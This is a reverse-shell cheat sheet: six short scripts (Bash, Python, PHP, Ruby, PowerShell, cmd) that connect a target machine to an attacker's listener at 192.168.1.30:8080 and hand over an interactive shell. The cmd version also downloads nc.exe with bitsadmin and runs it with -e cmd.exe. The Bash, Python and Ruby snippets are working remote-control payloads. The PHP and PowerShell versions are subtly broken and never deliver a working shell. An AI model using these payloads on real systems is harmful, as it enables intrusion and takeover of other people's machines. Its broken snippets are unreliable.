# Bash

```bash
#!/bin/bash

# Connect to the listening port on the remote machine
# and provide a command line for the attacker to control the target machine

# Set the remote IP address and port number
IP=192.168.1.30
PORT=8080

# Create the reverse shell connection
/bin/bash -i > /dev/tcp/$IP/$PORT 0<&1 2>&1
```

# Python
```python
#!/usr/bin/env python3

# Connect to the listening port on the remote machine
# and provide a command line for the attacker to control the target machine

import socket
import subprocess

# Set the remote IP address and port number
IP = "192.168.1.30"
PORT = 8080

# Create a socket and connect to the remote machine
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

# Provide the attacker with a command line on the target machine
# by spawning a shell and redirecting its input and output streams
# to the connected socket
p = subprocess.Popen(["/bin/sh", "-i"], stdin=s, stdout=s, stderr=s)
```


# Php
```php
#!/usr/bin/php

<?php

// Connect to the listening port on the remote machine
// and provide a command line for the attacker to control the target machine

// Set the remote IP address and port number
$ip = "192.168.1.30";
$port = 8080;

// Create a TCP/IP socket
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    die("Failed to create socket: " . socket_strerror(socket_last_error()) . "\n");
}

// Connect to the remote machine
$result = socket_connect($socket, $ip, $port);
if ($result === false) {
    die("Failed to connect to $ip:$port: " . socket_strerror(socket_last_error()) . "\n");
}

// Provide the attacker with a command line on the target machine
// by spawning a shell and redirecting its input and output streams
// to the connected socket
$command = "sh -i";
socket_write($socket, $command . "\n");

// Read output from the command and write it to the socket
// until the command exits
while (!feof($socket)) {
    $line = fgets($socket);
    if ($line === false) {
        break;
    }
    print $line;
    socket_write($socket, $line);
}

// Close the socket
socket_close($socket);

?>
```

# Ruby
```ruby
#!/usr/bin/env ruby

# Connect to the listening port on the remote machine
# and provide a command line for the attacker to control the target machine

require 'socket'

# Set the remote IP address and port number
IP = "192.168.1.30"
PORT = 8080

# Create a socket and connect to the remote machine
socket = TCPSocket.new(IP, PORT)

# Provide the attacker with a command line on the target machine
# by spawning a shell and redirecting its input and output streams
# to the connected socket
system "/bin/sh -i <&#{socket.fileno} >&#{socket.fileno} 2>&#{socket.fileno}"

# Close the socket
socket.close
```

# Powershell
```powershell
# Connect to the listening port on the remote machine
# and provide a command line for the attacker to control the target machine

# Set the remote IP address and port number
$ip = "192.168.1.30"
$port = 8080

# Create a socket and connect to the remote machine
$socket = New-Object System.Net.Sockets.TcpClient($ip, $port)

# Provide the attacker with a command line on the target machine
# by spawning a shell and redirecting its input and output streams
# to the connected socket
$stream = $socket.GetStream()
[byte[]]$bytes = 0..255|%{0}
$encoding = New-Object System.Text.AsciiEncoding
while($stream.DataAvailable)
{
    $read = $stream.Read($bytes, 0, $bytes.Length)
    $data = $encoding.GetString($bytes,0, $read)
    $command = $data.Replace("`n", "`n")
    $command = $command.Replace("`r", "`n")
    $command = $command.Replace("`n", [char]13)
    $command = $command.Replace("`n", [char]10)
    try
    {
        $output = [System.Text.Encoding]::ASCII.GetBytes((iex $command 2>&1))
    }
    catch
    {
        Write-Error "Error: $($_.Exception.Message)"
    }
    $stream.Write($output, 0, $output.Length)
}
$stream.Close()
$socket.Close()
```
# Cmd
```cmd
@echo off

rem Download the nc utility from the specified URL
bitsadmin /transfer nc /download /priority foreground https://eternallybored.org/misc/netcat/nc.exe c:\nc.exe

rem Set the remote IP address and port number
set IP=192.168.1.30
set PORT=8080

rem Create a socket and connect to the remote machine
c:\nc.exe -n %IP% %PORT% -e cmd.exe
```








